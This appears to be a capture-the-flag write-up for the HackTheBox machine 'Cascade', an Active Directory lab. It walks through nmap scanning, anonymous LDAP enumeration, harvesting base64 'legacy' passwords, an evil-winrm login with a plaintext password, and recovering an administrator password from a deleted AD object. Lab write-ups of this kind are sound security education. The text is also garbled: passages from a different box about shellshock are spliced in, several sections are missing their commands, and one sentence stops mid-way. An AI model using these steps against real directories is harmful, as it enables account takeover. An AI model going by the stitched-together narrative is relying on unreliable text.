
# Cascade - hackthebox

![cascade badge](images/cascade/cascadebadge.jpg)

Cascade is a Windows machine rated Medium on HTB.

## Port Scan

`nmap -sC -sV -p- 10.10.10.182`

```
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2020-04-15 07:08:38Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
<SNIP>
Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
```

This is a AD machine, so let's start with LDAP enumeration.

## LDAP Enumeration

Let's use the LDAP search tool: [ldapsearch](https://linux.die.net/man/1/ldapsearch).

```
root@kali:~/htb/cascade# ldapsearch -h 10.10.10.182 -b "DC=CASCADE,DC=LOCAL"
SASL/DIGEST-MD5 authentication started
Please enter your password: 
ldap_sasl_interactive_bind_s: Invalid credentials (49)
	additional info: 8009030C: LdapErr: DSID-0C09053E, comment: AcceptSecurityContext error, data 52e, v1db1
```

By default, ldapsearch tries to authenticate via [SASL](https://ldapwiki.com/wiki/SASL). As we don't have any credentials, we need to add a `-x` flag to turn off the SASL authentication.

`ldapsearch -x -h 10.10.10.182 -b "DC=CASCADE,DC=LOCAL"`

The `-b` flag sets the base for the search. And the default filter is `(objectClass=*)` which returns all objects. This is the broadest search possible, so it returns a lot of output.

A good start is to grep for passwords.

```
root@kali:~/htb/cascade# grep -Ei "passw|pwd" ldap.txt 
<SNIP>
cascadeLegacyPwd: clk0bjVldmE=
<SNIP>
```

We find a legacy password. Now let's zoom into this section to see which user this password belongs to.

Now that we have a set of credentials, it's time to try it out on other services.

## SMB Enumeration


![bug](images/shocker/dontbugme.jpg)

This image pretty much confirms that we need to look for a shellshock vulnerability here.

This seems to be password for the VNC application.

## VNC Password Decryption

Online research shows that the VNC password is encrypted. There are several tools for decrypting it.

If not for the box name and the image, I might not have thought of testing for this specific vulnerability straightaway. This box is didactic.

This is the set of credentials we have gathered.

*
*

Time to try it out on other services.

## Database Dumping

As winrm gives us the most direct channel into the machine, we always try that first with any new credentials.

enum4linux

Let's exfiltrate the database file to examine its contents.

It appears to be an encrypted password.

## Decompiling For Decryption Function

Another file in the Audit share gave us a clue towards decrypting the password.

This is what the CascAudit.exe does:

* Retrieves and decrypts the password in the SQL table LDAP
* Uses arksvc's account to retrieve attributes of deleted users using a LDAP query
* Writes the retrieved information into the SQL table DeletedUserAudit

dotPeek has a function to export the whole decompiled program as a C# project.

After running this short program, we have the password for arksvc.

## Probing Deleted AD Objects

Now let's switch to arksvc's account.

`evil-winrm -i 10.10.10.182 -u arksvc -p w3lc0meFr31nd`

From the 

`Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects`

Let's retrieve all attributes of TempUser with `Get-ADObject`.

```
*Evil-WinRM* PS C:\Windows> Get-ADObject -Identity ‘f0cc344d-31e0-4866-bceb-a842791ca059’ -properties *  -includeDeletedObjects


accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : cascade.local/Deleted Objects/TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
CN                              : TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
<SNIP>
```

We find another password which is probably base64 encoded like the first legacy password we found.

```
root@kali:~/htb/cascade# echo YmFDVDNyMWFOMDBkbGVz | base64 -d
baCT3r1aN00dles
```

From the Meeting Notes we found earlier, we know that this is the Administrator's password.

# Ending Thoughts

Although this is an easy straightforward box, I've learned more by exploiting manually using Burp to sent requests and trying to understand every step of the way.

You can also use Metasploit or other available exploits to root this box.

**Active Directory Recycle Bin**

* https://blog.stealthbits.com/active-directory-object-recovery-recycle-bin/
* https://www.lepide.com/how-to/restore-deleted-objects-in-active-directory.html

**Ldapsearch**

* https://docs.oracle.com/cd/E19450-01/820-6169/ldapsearch-examples.html#gentextid-4476 
* https://devconnected.com/how-to-search-ldap-using-ldapsearch-examples/